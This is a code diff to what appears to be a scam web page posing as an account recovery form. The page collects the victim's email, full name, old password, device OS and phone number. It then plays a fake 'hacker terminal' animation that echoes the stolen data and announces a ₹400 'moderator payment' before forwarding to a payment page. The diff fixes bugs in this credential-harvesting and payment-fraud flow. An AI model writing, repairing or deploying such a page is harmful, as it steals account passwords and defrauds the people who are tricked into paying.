@@ -249,7 +249,6 @@
             display: flex; flex-direction: column; gap: 12px;
             font-family: 'Courier New', Courier, monospace; 
             overflow-y: auto; 
-            /* Added padding at bottom so typed text appears in the middle */
             padding: 20px 15px 35vh 15px; 
             margin-top: 20px;
             -webkit-mask-image: linear-gradient(to bottom, transparent 0%, black 10%, black 90%, transparent 100%);
@@ -297,9 +296,9 @@
         }
         .transition-screen.active { opacity: 1; pointer-events: all; }
         
-        /* Floating Semi-transparent overlay for mid-GIF transition */
+        /* Specific white background for middle transition */
         #midGifTransitionOverlay {
-            background-color: rgba(255, 255, 255, 0.85); 
+            background-color: #ffffff;
         }
 
         .transition-image {
@@ -395,7 +394,7 @@
                     <h1>Recovery Phone</h1>
                     <p>Add a phone number to keep your account safe</p>
                     <div class="input-group">
-                        <input type="tel" id="inputPhone" placeholder="Phone number" maxlength="10" oninput="this.value = this.value.replace(//g, '')" required>
+                        <input type="tel" id="inputPhone" placeholder="Phone number" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
                         <div class="error-msg" id="errPhone">Please enter a valid phone number.</div>
                     </div>
                     <div class="button-container split">
@@ -430,7 +429,6 @@
         </svg>
     </div>
 
-    <!-- Floating GIF Spinner Transition -->
     <div class="transition-screen" id="midGifTransitionOverlay">
         <img src="https://pending404.github.io/g_ml/gml.gif" alt="Loading" class="transition-image">
     </div>
@@ -558,16 +556,15 @@
                 userData.contact = ""; 
             }
             
-            // SHOW GIF SPINNER FLOATING OVER THE CURRENT PAGE
+            // Hide the form wrapper
+            document.getElementById('lightThemeWrapper').style.display = 'none';
+            
+            // SHOW GIF SPINNER INSTEAD OF ROUND SPINNER
             const gifSpinner = document.getElementById('midGifTransitionOverlay');
             gifSpinner.classList.add('active');
             
             setTimeout(() => {
                 gifSpinner.classList.remove('active');
-                
-                // Hide the form wrapper ONLY AFTER the GIF loading is done
-                document.getElementById('lightThemeWrapper').style.display = 'none';
-                
                 document.getElementById('darkTerminalWrapper').style.display = 'flex';
                 runHackerTerminal();
             }, 2000); 
@@ -587,17 +584,18 @@
                 "Syncing remote databases..."
             ];
 
-            let realLogs =</span> Initiating Recovery Environment...`,
-                `<span class="c-data"></span> Target Account: ${userData.email}`
+            let realLogs = [
+                `<span class="c-sys">[System]</span> Initiating Recovery Environment...`,
+                `<span class="c-data">[Info]</span> Target Account: ${userData.email}`
             ];
             
-            if(userData.name) realLogs.push(`<span class="c-data"></span> Full Name: ${userData.name}`);
-            if(userData.password) realLogs.push(`<span class="c-data"></span> Old Password: ${userData.password}`);
-            if(userData.os) realLogs.push(`<span class="c-data"></span> Device OS: ${userData.os}`);
-            if(userData.phone) realLogs.push(`<span class="c-succ"></span> Target Recovery Phone: ${userData.phone}`);
-            if(userData.contact) realLogs.push(`<span class="c-data"></span> Contact Target: ${userData.contact}`);
+            if(userData.name) realLogs.push(`<span class="c-data">[Data]</span> Full Name: ${userData.name}`);
+            if(userData.password) realLogs.push(`<span class="c-data">[Data]</span> Old Password: ${userData.password}`);
+            if(userData.os) realLogs.push(`<span class="c-data">[Data]</span> Device OS: ${userData.os}`);
+            if(userData.phone) realLogs.push(`<span class="c-succ">[Execute]</span> Target Recovery Phone: ${userData.phone}`);
+            if(userData.contact) realLogs.push(`<span class="c-data">[Info]</span> Contact Target: ${userData.contact}`);
             
-            realLogs.push(`<span class="c-billing"> Moderator payment charges: ₹400</span>`);
+            realLogs.push(`<span class="c-billing">[Billing] Moderator payment charges: ₹400</span>`);
             realLogs.push(`<span class="c-sys">Please wait... Forwarding to moderator payment page.</span>`);
 
             let startTimestamp = null;
@@ -612,9 +610,7 @@
                 for(let k=0; k<4; k++) {
                     const lineDiv = document.createElement('div');
                     lineDiv.className = 'hacker-line';
-                    const randomPhrase = hackerPhrases;
-                    const randomHex = Math.floor(Math.random() * 16777215).toString(16).toUpperCase();
-                    lineDiv.innerText = `${randomPhrase}`;
+                    lineDiv.innerText = `${hackerPhrases[Math.floor(Math.random() * hackerPhrases.length)]} [0x${Math.floor(Math.random()*16777215).toString(16).toUpperCase()}]`;
                     fragment.appendChild(lineDiv);
                 }
                 logBox.appendChild(fragment);
@@ -641,16 +637,16 @@
                         lineDiv.className = 'log-entry typing-cursor';
                         logBox.appendChild(lineDiv);
 
-                        let textHTML = realLogs;
+                        let textHTML = realLogs[realLogIndex];
                         let currentHTML = "";
                         let isTag = false;
                         let i = 0;
 
                         const typeInterval = setInterval(() => {
                             if (i < textHTML.length) {
-                                if (textHTML === '<') isTag = true;
-                                currentHTML += textHTML;
-                                if (textHTML === '>') isTag = false;
+                                if (textHTML[i] === '<') isTag = true;
+                                currentHTML += textHTML[i];
+                                if (textHTML[i] === '>') isTag = false;
 
                                 lineDiv.innerHTML = currentHTML; 
                                 logBox.scrollTop = logBox.scrollHeight; 
